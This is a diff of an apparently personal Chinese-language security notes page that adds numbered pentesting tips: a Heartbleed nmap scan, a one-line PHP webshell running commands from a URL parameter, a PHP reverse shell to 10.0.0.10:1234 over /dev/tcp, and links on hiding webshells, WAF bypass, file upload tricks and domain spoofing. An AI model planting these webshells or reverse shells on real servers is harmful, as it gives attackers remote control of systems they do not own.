@@ -121,7 +121,7 @@
 
       <div class="read-time">
         <small>
-          35 minute read
+          36 minute read
         </small>
       </div>
 
@@ -2410,9 +2410,9 @@ windows:
 331.</span>HOOK原理:
     http://blog.csdn.net/on_1y/article/details/7595184
 <span class="p">
-332.</span>心脏滴血漏洞检测:
+332.</span>心脏滴血(openssl)漏洞检测:
     https://github.com/vs4vijay/exploits
-            nmap --script=ssl-heartbleed -p 443
+        nmap -sV -p ??? --script=ssl-heartbleed 192.168.1.1
 <span class="p">
 333.</span>查看乌云完整文章方法
     https://web-beta.archive.org/web/20160719120927/http://drops.wooyun.org:80/
@@ -2421,9 +2421,32 @@ windows:
 <span class="p">
 334.</span>php的unserialize函数漏洞理解
     http://www.91ri.org/3960.html
+    http://www.cnblogs.com/LittleHann/p/4242535.html    (cool)
 <span class="p">
 335.</span>macOS自带apache路径
     http://blog.csdn.net/seafishyls/article/details/44546809
+<span class="p">
+336.</span>最简单的webshell
+    <span class="cp">&lt;?=`$_GET[1]`?&gt;</span>
+    reverse shell
+    <span class="err">&lt;</span>?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;<span class="ni">&amp;1'");</span>?&gt;<span class="sb">
+
+    最全的关于webshell隐藏的文章
+    http://www.cnblogs.com/LittleHann/p/3522990.html
+
+</span><span class="p">337.</span>waf绕过小结
+    https://www.peerlyst.com/posts/list-of-waf-security-bypass-research-karl-m-1
+<span class="p">
+338.</span>文件上传技巧
+    https://xianzhi.aliyun.com/forum/read/458.html
+<span class="p">
+339.</span>域名欺骗
+    http://bobao.360.cn/learning/detail/3736.html
+<span class="p">
+340.</span>logmein支持不同内网间直接ssh登录,用logmein hamachi加入或创建网络即可
+<span class="p">
+341.</span>php的webshell检测工具可参考
+    https://github.com/cfc4n/pecker
 </code></pre>
 </div>
 </span>
